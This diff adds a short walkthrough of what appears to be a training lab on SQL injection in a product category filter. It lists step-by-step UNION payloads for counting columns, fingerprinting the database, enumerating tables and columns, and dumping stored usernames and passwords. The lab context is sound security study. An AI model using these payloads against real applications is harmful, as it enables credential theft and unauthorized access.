@@ -1,0 +1,47 @@
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, 
+then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user. 
+
+Hint: You can find some useful payloads on our SQL injection cheat sheet. 
+
+End Goal:
+- Determine the table that contains usernames and passwords
+- Determine the content of the table
+- Output the content of the table
+- Log in as the administrator user
+
+Analysis:
+---------
+
+1) Find the number of columns
+' order by 3-- => internal server error
+
+3-1=2
+
+2) Find the data type of the columns
+' UNION select 'a', 'a'--
+- both columns accept type text
+
+3) Version of the database
+' UNION select @@version, NULL-- => not Microsoft
+' UNION select version(), NULL-- => 200 response PostgreSQL
+
+4) Output the list of table names in the database
+
+' UNION select table_name, NULL from information_schema.tables --
+
+users_skcydb
+
+5) Output the column names of the table
+
+' UNION select column_name, NULL from information_schema.columns where table_name='users_skcydb'--
+
+username_skdhbe
+password_ksddnm
+
+6) Output the usernames and passwords
+
+' UNION select username_skdhbe, password_ksddnm from users_skcydb--
